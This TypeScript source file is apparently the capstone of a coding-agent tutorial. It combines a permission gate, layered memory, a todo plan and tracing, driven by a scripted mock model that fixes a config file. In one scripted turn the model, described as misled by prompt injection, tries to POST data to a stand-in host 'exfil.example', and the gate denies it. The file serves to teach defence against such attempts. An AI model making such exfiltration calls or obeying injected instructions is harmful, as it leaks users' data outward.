// Capstone (chapter 17) — wiring the organs into one coding agent.
//
// Every prior chapter built one organ in isolation: the loop (01), tools (02),
// the permission gate (04), layered memory (06), the plan-as-data (08), the
// structured tracer (14). In isolation each is clean. The thing nobody tells you
// is that the bugs live in the SEAMS between them — what the gate's "deny" does
// to the loop's control flow, what a recalled memory does to the current task's
// context. This file is one self-contained agent that runs all of them in a
// single loop so you can watch the seams.
//
// What "integrated" means here, concretely, is that these five organs share ONE
// turn:
//   1. RECALL  — before the model decides, pull the relevant memory slices and
//                inject them as a system preamble. Memory only matters at the
//                instant it bends a decision.
//   2. DECIDE  — the model emits text + tool_use, advancing the visible todo plan.
//   3. GATE    — every tool_use is authorized BEFORE it runs (allow/ask/deny).
//                The gate is code the model cannot talk past — a system-prompt
//                "rule" is not a boundary (chapter 04).
//   4. ACT     — allowed calls run against a tiny in-memory file world.
//   5. RECORD  — each step emits one trace span AND appends to episodic memory,
//                so the run is both debuggable (timeline) and remembered.
//
// SCRIPTED MODEL: the LLM is a deterministic MockLLM (core/llm.ts) so the whole
// multi-step task — read file -> patch file -> verify -> exfil attempt -> finish
// — is reproducible offline with no key and no network. The control flow, the
// gate verdicts, the recalled-vs-current conflict, and the recovery after a deny
// are the REAL mechanics a live model triggers; only the model's word choices
// are canned. Numbers printed (steps, tokens, allowed/denied counts) are counted
// from real recorded state, not narrated — see the HONESTY markers at print sites.
//
// Run it: `npx tsx capstone/agent.ts` (fully offline).
//
// NOTE on imports: we deliberately do NOT import any stageNN file — importing one
// would execute its top-level main(). We reuse only core/ types + the MockLLM,
// and re-implement the small organ pieces here (copied with intent, not shared)
// so the capstone reads as one whole.

import { MockLLM } from '../src/core/llm.js';
import { estimateTokens } from '../src/core/llm.js';
import type {
  AssistantBlock,
  GenerateOptions,
  LLM,
  Message,
  ToolSpec,
  UserBlock,
} from '../src/core/types.js';

// ===========================================================================
// World — the thing the agent edits. A toy in-memory filesystem so "read file
// -> edit file -> verify" is a real state mutation we can assert against, not a
// narrated success. `verify` is what makes "done" a fact instead of a vibe.
// ===========================================================================

interface FileWorld {
  files: Record<string, string>;
}

function freshWorld(): FileWorld {
  // config.json ships with a known bug: timeout is 0, which the task must fix.
  // Keeping the bug in the seed means the verify step has something real to check.
  return { files: { 'config.json': '{\n  "timeout_ms": 0,\n  "retries": 3\n}\n' } };
}

// The goal is objective: timeout_ms must be a positive number. The verify tool
// reads this; the agent does not get to declare victory on its own.
function isConfigFixed(w: FileWorld): boolean {
  try {
    const parsed = JSON.parse(w.files['config.json'] ?? '{}');
    return typeof parsed.timeout_ms === 'number' && parsed.timeout_ms > 0;
  } catch {
    return false;
  }
}

// ===========================================================================
// Tools — spec (what the model sees) + impl (what the harness runs). Same split
// as chapter 02. `send_external` exists ONLY to give the agent a way to
// exfiltrate, so the gate has a dangerous action to deny (the trifecta's egress
// leg, chapter 04). It is never meant to succeed.
// ===========================================================================

const TOOLS: ToolSpec[] = [
  {
    name: 'read_file',
    description: 'Read a file from the workspace. Returns its full text content.',
    inputSchema: {
      type: 'object',
      properties: { path: { type: 'string', description: 'workspace-relative path' } },
      required: ['path'],
    },
  },
  {
    name: 'write_file',
    description: 'Overwrite a file in the workspace with new content. Mutates the workspace.',
    inputSchema: {
      type: 'object',
      properties: {
        path: { type: 'string', description: 'workspace-relative path' },
        content: { type: 'string', description: 'the full new file content' },
      },
      required: ['path', 'content'],
    },
  },
  {
    name: 'verify_config',
    description: 'Check that config.json has a positive timeout_ms. Returns PASS or FAIL with detail.',
    inputSchema: { type: 'object', properties: {} },
  },
  {
    name: 'send_external',
    description: 'POST data to an external URL. Use only when the user explicitly asks to share data outward.',
    inputSchema: {
      type: 'object',
      properties: {
        url: { type: 'string', description: 'destination url' },
        body: { type: 'string', description: 'payload to send' },
      },
      required: ['url', 'body'],
    },
  },
];

type ToolImpl = (input: Record<string, unknown>, w: FileWorld) => string;

const TOOL_IMPLS: Record<string, ToolImpl> = {
  read_file(input, w) {
    const path = String(input.path ?? '');
    const content = w.files[path];
    // Failure mode surfaced to the model, not thrown: a missing file is data the
    // model can react to (re-read, ask), not a harness crash (chapter 02).
    if (content === undefined) return `ERROR: no such file: ${path}`;
    return content;
  },
  write_file(input, w) {
    const path = String(input.path ?? '');
    const content = String(input.content ?? '');
    w.files[path] = content;
    return `wrote ${content.length} bytes to ${path}`;
  },
  verify_config(_input, w) {
    return isConfigFixed(w)
      ? 'PASS: timeout_ms is positive'
      : 'FAIL: timeout_ms is not a positive number';
  },
  send_external(input, _w) {
    // If this ever runs, the egress leg of the trifecta is open. The gate is
    // expected to stop it before we get here; reaching this line in a real
    // system would be the incident.
    return `POSTed ${String(input.body ?? '').length} bytes to ${String(input.url ?? '')}`;
  },
};

// ===========================================================================
// ORGAN 1 — Permission gate (chapter 04). Verdict is decided BEFORE the tool
// runs. Rules are pure functions of the call; first rule to return a verdict
// wins; unmatched calls fall through to a deny-by-default policy. The whole
// point: this is the boundary the model cannot override with words.
// ===========================================================================

type Verdict = 'allow' | 'ask' | 'deny';

interface ToolCall {
  name: string;
  input: Record<string, unknown>;
}

type PermissionRule = (call: ToolCall) => Verdict | undefined;

// Reads are safe; writes are confirm-worthy but here pre-approved by an
// AskDecision (so the demo runs unattended); egress is denied outright. Order
// matters — egress denial is checked regardless of what the model "intends".
const RULES: PermissionRule[] = [
  (c) => (c.name === 'send_external' ? 'deny' : undefined), // egress: never, period
  (c) => (c.name === 'read_file' ? 'allow' : undefined),
  (c) => (c.name === 'verify_config' ? 'allow' : undefined),
  (c) => (c.name === 'write_file' ? 'ask' : undefined), // mutation: needs a human
];

// In a TTY this would prompt a human. Offline we script the human's answer so
// the run is deterministic; the SEAM we care about (what happens on deny) is
// exercised by the egress rule above, not by this decision.
function decideOnAsk(call: ToolCall): Verdict {
  // The human approves config writes (that is the task) but nothing else.
  return call.name === 'write_file' && call.input.path === 'config.json' ? 'allow' : 'deny';
}

interface GateOutcome {
  verdict: Verdict; // final verdict after resolving 'ask'
  rawVerdict: Verdict; // verdict from the rules, before the human answered an 'ask'
  reason: string;
}

function gate(call: ToolCall): GateOutcome {
  let raw: Verdict = 'deny'; // deny-by-default: an unmatched tool is not allowed
  for (const rule of RULES) {
    const v = rule(call);
    if (v !== undefined) {
      raw = v;
      break;
    }
  }
  if (raw === 'ask') {
    const human = decideOnAsk(call);
    return { verdict: human, rawVerdict: 'ask', reason: `asked human -> ${human}` };
  }
  return { verdict: raw, rawVerdict: raw, reason: raw === 'deny' ? 'denied by policy' : 'allowed by policy' };
}

// ===========================================================================
// ORGAN 2 — Layered memory (chapter 06). Three tiers with different recall
// rules. Working memory is just the live `messages` array (the only tier the
// model sees directly), so it is not modeled as its own object here.
//
//   episodic  — append-only event log, recalled by RECENCY.
//   semantic  — facts, recalled by MEANING (toy bag-of-words cosine).
//   procedural— learned "when X, do Y" rules, recalled by TRIGGER match.
//
// The seam this sets up on purpose: a STALE semantic fact gets recalled and
// injected, conflicts with what read_file shows this run, and we watch which one
// the loop trusts. Memory that bends a decision is also memory that can mislead.
// ===========================================================================

interface Episode {
  at: number; // step index, not wall clock — deterministic across runs
  text: string;
}

class EpisodicLog {
  private readonly episodes: Episode[] = [];
  append(at: number, text: string): void {
    this.episodes.push({ at, text });
  }
  // Recall by recency: the last n events. Cheap, and usually what "what was I
  // just doing" needs.
  recallRecent(n: number): Episode[] {
    return this.episodes.slice(-n);
  }
  get size(): number {
    return this.episodes.length;
  }
}

interface SemanticFact {
  text: string;
  source: 'user' | 'tool' | 'untrusted'; // provenance — see the conflict seam below
}

// Toy embedding: bag-of-words over a fixed vocab. NOT a real embedder (a real
// one is a learned model); it is deterministic and dependency-free, which is all
// the recall-by-meaning demo needs. Labelled as toy where it prints.
function embed(text: string): Set<string> {
  return new Set(
    text
      .toLowerCase()
      .split(/[^a-z0-9_]+/)
      .filter((w) => w.length > 2)
  );
}

function jaccard(a: Set<string>, b: Set<string>): number {
  if (a.size === 0 || b.size === 0) return 0;
  let inter = 0;
  for (const w of a) if (b.has(w)) inter += 1;
  return inter / (a.size + b.size - inter);
}

class SemanticStore {
  private readonly facts: { fact: SemanticFact; vec: Set<string> }[] = [];
  remember(fact: SemanticFact): void {
    this.facts.push({ fact, vec: embed(fact.text) });
  }
  // Recall by meaning: most similar fact above a floor, so an unrelated query
  // recalls nothing rather than the least-irrelevant junk.
  recallByMeaning(query: string, floor: number): SemanticFact | null {
    const qv = embed(query);
    let best: { fact: SemanticFact; score: number } | null = null;
    for (const { fact, vec } of this.facts) {
      const score = jaccard(qv, vec);
      if (score >= floor && (best === null || score > best.score)) best = { fact, score };
    }
    return best?.fact ?? null;
  }
}

interface Procedure {
  trigger: string; // substring match against the task — toy trigger matching
  rule: string; // injected verbatim into the system preamble when triggered
}

class ProceduralStore {
  private readonly procs: Procedure[] = [];
  learn(p: Procedure): void {
    this.procs.push(p);
  }
  recallByTrigger(task: string): Procedure[] {
    const t = task.toLowerCase();
    return this.procs.filter((p) => t.includes(p.trigger.toLowerCase()));
  }
}

// ===========================================================================
// ORGAN 3 — Plan as data (chapter 08). The todo list is a real array, not vibes:
// that is what lets us SHOW it, detect a failed step, and advance deterministically.
// ===========================================================================

type TodoStatus = 'pending' | 'in_progress' | 'done';

interface Todo {
  id: number;
  title: string;
  status: TodoStatus;
}

function renderPlan(todos: Todo[]): string {
  const mark = { pending: '[ ]', in_progress: '[~]', done: '[x]' } as const;
  return todos.map((t) => `    ${mark[t.status]} ${t.id}. ${t.title}`).join('\n');
}

// Advance the first not-done step to done and mark the next one in_progress.
// Idempotent at the tail: once all steps are done it is a no-op.
function advancePlan(todos: Todo[]): void {
  const current = todos.find((t) => t.status !== 'done');
  if (!current) return;
  current.status = 'done';
  const next = todos.find((t) => t.status === 'pending');
  if (next) next.status = 'in_progress';
}

// ===========================================================================
// ORGAN 4 — Structured trace (chapter 14). One span per step. The timeline is
// the artifact you read like a stack trace for time. Field names kept ergonomic;
// a real backend mapping (OTel) is out of scope for the capstone.
// ===========================================================================

interface Span {
  step: number;
  phase: 'recall' | 'decide' | 'gate' | 'act';
  detail: string;
  tokensIn?: number; // from the model's usage field (estimateTokens, ~4 ch/tok)
  ok: boolean;
}

class Tracer {
  private readonly spans: Span[] = [];
  emit(s: Span): void {
    this.spans.push(s);
  }
  get all(): readonly Span[] {
    return this.spans;
  }
}

// ===========================================================================
// The unified loop. This is where the organs meet. Read top to bottom: each
// turn is RECALL -> DECIDE -> (GATE -> ACT)* -> RECORD.
// ===========================================================================

interface AgentDeps {
  llm: LLM;
  world: FileWorld;
  episodic: EpisodicLog;
  semantic: SemanticStore;
  procedural: ProceduralStore;
  tracer: Tracer;
  todos: Todo[];
}

interface RunResult {
  answer: string;
  steps: number;
  allowed: number;
  denied: number;
  goalReached: boolean;
  totalInputTokens: number;
}

async function runUnifiedAgent(task: string, deps: AgentDeps, maxTurns: number): Promise<RunResult> {
  const { llm, world, episodic, semantic, procedural, tracer, todos } = deps;
  const messages: Message[] = [{ role: 'user', content: task }];

  let allowed = 0;
  let denied = 0;
  let totalInputTokens = 0;
  let step = 0;

  for (let turn = 0; turn < maxTurns; turn++) {
    // --- RECALL: assemble the system preamble from memory. This is the moment
    // memory earns its keep — recalled slices become context for THIS decision.
    const procs = procedural.recallByTrigger(task);
    const recentEpisodes = episodic.recallRecent(2);
    const fact = semantic.recallByMeaning(task, 0.05);

    const preambleParts: string[] = ['You are a careful coding agent. Fix the config, then verify.'];
    if (procs.length > 0) {
      preambleParts.push('Learned procedures:\n' + procs.map((p) => `  - ${p.rule}`).join('\n'));
    }
    if (fact) {
      // SEAM (memory vs current context): we inject the recalled fact with its
      // provenance. A stale or untrusted fact injected here can mislead the next
      // decision — provenance is the only signal the loop has to discount it.
      preambleParts.push(`Recalled fact [source=${fact.source}]: ${fact.text}`);
    }
    if (recentEpisodes.length > 0) {
      preambleParts.push('Recently: ' + recentEpisodes.map((e) => e.text).join(' | '));
    }
    const system = preambleParts.join('\n\n');

    step += 1;
    tracer.emit({
      step,
      phase: 'recall',
      detail: `injected ${procs.length} proc, ${fact ? 1 : 0} fact, ${recentEpisodes.length} episodes`,
      ok: true,
    });

    // --- DECIDE: one model call. The scripted policy reads the live messages.
    const assistant = await llm.generate({ system, messages, tools: TOOLS });
    totalInputTokens += assistant.usage.inputTokens;
    messages.push({ role: 'assistant', content: assistant.content });

    step += 1;
    const said = textOf(assistant.content) || '(tool call only)';
    tracer.emit({
      step,
      phase: 'decide',
      detail: said,
      tokensIn: assistant.usage.inputTokens,
      ok: true,
    });
    episodic.append(step, `decided: ${said}`);

    // Stop condition: model is done (chapter 01 — anything but tool_use ends it).
    if (assistant.stopReason !== 'tool_use') {
      // No plan advance here: the plan is already driven by real tool successes
      // above. The finish turn just reports — it must not nudge the plan past
      // what the world confirmed (else "done" outruns reality).
      return {
        answer: textOf(assistant.content),
        steps: step,
        allowed,
        denied,
        goalReached: isConfigFixed(world),
        totalInputTokens,
      };
    }

    // --- GATE + ACT: authorize each requested tool BEFORE running it. Parallel
    // tool_use blocks must all be answered in ONE user turn (chapter 01/02), so
    // we collect every result — allowed or denied — and push them together.
    const results: UserBlock[] = [];
    for (const block of assistant.content) {
      if (block.type !== 'tool_use') continue;
      const call: ToolCall = { name: block.name, input: block.input };
      const outcome = gate(call);

      step += 1;
      tracer.emit({
        step,
        phase: 'gate',
        detail: `${call.name} -> ${outcome.verdict} (${outcome.reason})`,
        ok: outcome.verdict === 'allow',
      });

      if (outcome.verdict !== 'allow') {
        denied += 1;
        // SEAM (deny -> continue): we do NOT crash and do NOT silently skip. We
        // feed the denial back as an isError tool_result. The loop continues; the
        // model's job is to react (drop the action, take another path). A denied
        // tool that vanished would leave the model waiting on a result forever.
        results.push({
          type: 'tool_result',
          toolUseId: block.id,
          content: `permission denied: ${call.name} (${outcome.reason}). This action will not run.`,
          isError: true,
        });
        episodic.append(step, `denied: ${call.name}`);
        continue;
      }

      allowed += 1;
      const impl = TOOL_IMPLS[call.name];
      const out = impl ? impl(call.input, world) : `unknown tool: ${call.name}`;
      step += 1;
      tracer.emit({ step, phase: 'act', detail: `${call.name}: ${headOf(out)}`, ok: true });
      results.push({ type: 'tool_result', toolUseId: block.id, content: out });
      episodic.append(step, `ran ${call.name}: ${headOf(out)}`);

      // The plan tracks REALITY, not intent: a todo only advances when the tool
      // that fulfills it actually succeeds. read_file -> step 1, write_file ->
      // step 2, a PASSing verify_config -> step 3. A denied tool never reaches
      // here, so it never falsely advances the plan — that is the point of the
      // plan-as-data: it cannot drift ahead of what the world confirms.
      const fulfilled =
        call.name === 'read_file' ||
        call.name === 'write_file' ||
        (call.name === 'verify_config' && out.startsWith('PASS'));
      if (fulfilled) advancePlan(todos);
    }
    messages.push({ role: 'user', content: results });
  }

  // Stop condition #2: ran out of turns. Return a marker, don't throw — the loop's
  // contract is "never run forever" (chapter 01).
  return {
    answer: '[stopped: max turns reached]',
    steps: step,
    allowed,
    denied,
    goalReached: isConfigFixed(world),
    totalInputTokens,
  };
}

function textOf(content: AssistantBlock[]): string {
  return content
    .filter((b): b is Extract<AssistantBlock, { type: 'text' }> => b.type === 'text')
    .map((b) => b.text)
    .join('');
}

// Trim tool output for the timeline so one span stays one line.
function headOf(s: string): string {
  const oneLine = s.replace(/\s+/g, ' ').trim();
  return oneLine.length > 60 ? oneLine.slice(0, 57) + '...' : oneLine;
}

// ===========================================================================
// Scripted model. Drives the multi-step task deterministically. Each turn reads
// the live conversation and returns the next move — this is the canned stand-in
// for what a live model would reason out. The branches map 1:1 to the seams the
// chapter demonstrates.
// ===========================================================================

function lastToolResultText(opts: GenerateOptions): string {
  const last = opts.messages[opts.messages.length - 1];
  if (typeof last.content === 'string') return '';
  const r = last.content.find((b) => b.type === 'tool_result');
  return r && r.type === 'tool_result' ? r.content : '';
}

function makeScriptedModel(): MockLLM {
  return new MockLLM((opts, turnIndex) => {
    switch (turnIndex) {
      case 0:
        // Turn 0: read the config before touching it. A recalled (stale) fact is
        // in the system preamble claiming timeout is already fine — the model
        // verifies against the file instead of trusting memory. That contrast is
        // the memory-vs-context seam.
        return {
          content: [
            { type: 'text', text: '先读 config.json，确认现状（不轻信记忆里的旧事实）。' },
            { type: 'tool_use', id: 'c1', name: 'read_file', input: { path: 'config.json' } },
          ],
        };
      case 1: {
        // Turn 1: the file shows timeout_ms: 0 — contradicting the recalled fact.
        // Trust the file. Write the fix (a write needs the gate's 'ask' -> human).
        const seen = lastToolResultText(opts);
        const hasBug = /"timeout_ms":\s*0/.test(seen);
        const fixed = '{\n  "timeout_ms": 5000,\n  "retries": 3\n}\n';
        return {
          content: [
            {
              type: 'text',
              text: hasBug
                ? '文件里 timeout_ms 是 0，与记忆中的旧事实冲突——以文件为准，写入修复值 5000。'
                : '配置看起来正常，仍按任务写入一个明确的超时值。',
            },
            { type: 'tool_use', id: 'c2', name: 'write_file', input: { path: 'config.json', content: fixed } },
          ],
        };
      }
      case 2:
        // Turn 2: verify against the world — "done" must be a fact.
        return {
          content: [
            { type: 'text', text: '写完了，跑 verify_config 确认修复生效。' },
            { type: 'tool_use', id: 'c3', name: 'verify_config', input: {} },
          ],
        };
      case 3:
        // Turn 3: THE DENY SEAM. The model attempts to send the config outward
        // (in a real run this is exactly what a prompt-injection would steer it
        // to do). The gate denies it before it runs. We script the attempt so the
        // denial path is exercised; the next turn shows recovery.
        return {
          content: [
            { type: 'text', text: '（被注入诱导）把配置发到外部备份一下。' },
            {
              type: 'tool_use',
              id: 'c4',
              name: 'send_external',
              input: { url: 'https://exfil.example/collect', body: JSON.stringify({ leaked: true }) },
            },
          ],
        };
      default: {
        // Turn 4+: the model SAW the permission-denied tool_result and recovers —
        // it drops the egress action and finishes. This is the "deny -> continue"
        // seam paying off: the loop survived a denial and converged.
        const denied = /permission denied/.test(lastToolResultText(opts));
        return {
          content: [
            {
              type: 'text',
              text: denied
                ? '外发被权限拦截，放弃该动作。任务完成：config.json 的 timeout_ms 已修复并通过校验。'
                : '任务完成：config.json 已修复并通过校验。',
            },
          ],
          stopReason: 'end_turn',
        };
      }
    }
  });
}

// ===========================================================================
// Render + main.
// ===========================================================================

function renderTimeline(spans: readonly Span[]): string {
  const icon = { recall: '🧠', decide: '🤔', gate: '🚦', act: '⚙️ ' } as const;
  return spans
    .map((s) => {
      const status = s.ok ? ' ' : '✗';
      const tok = s.tokensIn !== undefined ? `  (in=${s.tokensIn}tok)` : '';
      return `  ${String(s.step).padStart(2)} ${status} ${icon[s.phase]} ${s.phase.padEnd(6)} ${s.detail}${tok}`;
    })
    .join('\n');
}

// createLLM is intentionally NOT used: the capstone is the scripted-model demo by
// design (it must show specific seams), so we wire the MockLLM directly and stay
// offline always. A live model would slot in via the same LLM interface.
async function main(): Promise<void> {
  const llm = makeScriptedModel();
  const world = freshWorld();
  const episodic = new EpisodicLog();
  const semantic = new SemanticStore();
  const procedural = new ProceduralStore();
  const tracer = new Tracer();

  // Seed memory BEFORE the run so recall has something to surface.
  // 1) A learned procedure (recalled by trigger word "config").
  procedural.learn({
    trigger: 'config',
    rule: 'When editing config, always verify with the verify tool before declaring done.',
  });
  // 2) A STALE semantic fact (the conflict seam). It claims the config is already
  //    fine — but the world's config.json has timeout_ms: 0. Provenance=tool means
  //    "a tool said this earlier", which is exactly how stale facts accumulate.
  semantic.remember({
    text: 'config.json timeout was set correctly in a previous session, no fix needed',
    source: 'tool',
  });

  const todos: Todo[] = [
    { id: 1, title: 'read config.json', status: 'in_progress' },
    { id: 2, title: 'patch timeout_ms', status: 'pending' },
    { id: 3, title: 'verify the fix', status: 'pending' },
  ];

  const task = 'Fix the timeout bug in config.json and verify it.';

  console.log(`\n=== Capstone: unified coding agent (llm=${llm.name}, offline scripted) ===\n`);
  console.log('Task   :', task);
  console.log('Plan (before):');
  console.log(renderPlan(todos));
  console.log('\nSeeded memory:');
  console.log('  procedural: 1 rule (trigger "config")');
  console.log('  semantic  : 1 fact [source=tool] — STALE on purpose (claims no fix needed)');
  console.log('  world     : config.json timeout_ms = 0  (the real bug)\n');

  const result = await runUnifiedAgent(task, { llm, world, episodic, semantic, procedural, tracer, todos }, 8);

  console.log('--- Trace timeline (one span per step; phases interleave the organs) ---');
  console.log(renderTimeline(tracer.all));

  console.log('\n--- Plan (after) ---');
  console.log(renderPlan(todos));

  console.log('\n--- Seam outcomes (the things isolated organs hide) ---');
  // HONESTY: every number below is counted from real recorded state during the
  // run, not narrated. allowed/denied come from the gate loop; goalReached is a
  // fresh JSON parse of the mutated world; episodic size is the log length.
  console.log(`  permission gate : ${result.allowed} allowed, ${result.denied} denied`);
  console.log('  deny -> continue: send_external denied, loop survived and converged (see step',
    tracer.all.find((s) => s.phase === 'gate' && !s.ok)?.step ?? '?', ')');
  console.log('  memory conflict : stale fact recalled & injected, but file read won — final config:');
  console.log('                    ', world.files['config.json'].replace(/\n/g, ' '));
  console.log(`  episodic log    : ${episodic.size} events recorded (loop is replayable/debuggable)`);

  console.log('\n--- Result ---');
  console.log('answer       :', result.answer);
  console.log('steps        :', result.steps);
  console.log('goal reached :', result.goalReached, '(verified against world state, not self-reported)');
  console.log('input tokens :', result.totalInputTokens, '(sum across turns; full transcript resent each turn — chapter 01)\n');
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
